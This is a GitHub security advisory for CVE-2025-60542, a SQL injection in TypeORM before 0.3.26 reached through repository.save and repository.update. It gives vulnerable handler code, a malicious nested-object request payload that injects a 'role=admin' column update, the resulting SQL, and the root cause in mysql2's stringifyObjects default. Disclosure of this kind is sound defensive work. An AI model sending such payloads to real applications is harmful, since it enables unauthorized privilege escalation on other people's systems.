# [H] TypeORM vulnerable to SQL injection via crafted request to repository.save or repository.update

## Summary
Severity: High
Advisory: GHSA-q2pj-6v73-8rgj
CVE: CVE-2025-60542
CWE: CWE-89
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2025-10-29
Source: https://github.com/advisories/GHSA-q2pj-6v73-8rgj
Type: github-advisory

## Affected
- npm: `typeorm` — affected >=0 <0.3.26

## Details
### Summary

SQL Injection vulnerability in TypeORM before 0.3.26 via crafted request to repository.save or repository.update due to the sqlstring call using stringifyObjects default to false.

### Details

Vulnerable Code:

```js
const { username, city, name} = req.body;
const updateData = {
    username,
    city,
    name,
    id:userId
  }; // Developer aims to only allow above three fields to be updated    
const result = await userRepo.save(updateData);
```

Intended Payload (non-malicious):


`
username=myusername&city=Riga&name=Javad
`

_OR_

`{username:\"myusername\",phone:12345,name:\"Javad\"}
`

SQL query produced:

```sql
UPDATE `user` 
SET `username` = 'myusername', 
    `city` = 'Riga', 
    `name` = 'Javad' 
WHERE `id` IN (1);

```

Malicious Payload:

`username=myusername&city[name]=Riga&city[role]=admin
`

_OR_

`{username:\"myusername\",city:{name:\"Javad\",role:\"admin\"}}
`

SQL query produced with Injected Column:

```sql
UPDATE `user` 
SET `username` = 'myusername', 
    `city` = `name` = 'Javad', 
    `role` = 'admin' 
WHERE `id` IN (1);

```
_Above query is valid as `city` = `name` = `Javad` is a boolean expression resulting in `city` = 1 (false). “role” column is injected and updated._

Underlying issue was due to TypeORM using mysql2 [without specifying a value for the stringifyObjects option](https://github.com/typeorm/typeorm/blob/0.3.25/src/driver/mysql/MysqlConnectionOptions.ts). In both mysql and mysql2 this [option defaults to false](https://github.com/sidorares/node-mysql2/blob/e359f454a76ba5dc31b91adf7bdb4099ca317bb5/lib/connection_config.js#L124). This option is then passed into [SQLString library as false](https://github.com/sidorares/node-mysql2/blob/e359f454a76ba5dc31b91adf7bdb4099ca317bb5/lib/base/connection.js#L524). This results in sqlstring [parsing objects in a strange way using objectToValues.](https://github.com/mysqljs/sqlstring/blob/cd528556b4b6bcf300c3db515026935dedf7cfa1/lib/SqlString.js#L54)

## References
- https://nvd.nist.gov/vuln/detail/CVE-2025-60542
- https://github.com/typeorm/typeorm/pull/11574
- https://github.com/typeorm/typeorm/commit/d57fe3bd8578b0b8f9847647fd046bccf825a7ef
- https://github.com/mysqljs/sqlstring/blob/cd528556b4b6bcf300c3db515026935dedf7cfa1/lib/SqlString.js#L54
- https://github.com/sidorares/node-mysql2/blob/e359f454a76ba5dc31b91adf7bdb4099ca317bb5/lib/base/connection.js#L524
- https://github.com/sidorares/node-mysql2/blob/e359f454a76ba5dc31b91adf7bdb4099ca317bb5/lib/connection_config.js#L124
- https://github.com/typeorm/typeorm/blob/0.3.25/src/driver/mysql/MysqlConnectionOptions.ts
- https://github.com/typeorm/typeorm/releases/tag/0.3.26
- https://github.com/typeorm/typeorm/releases?q=security&expanded=true
- https://medium.com/@alizada.cavad/cve-2025-60542-typeorm-mysql-sqli-0-3-25-a1b32bc60453
- http://github.com/typeorm/typeorm
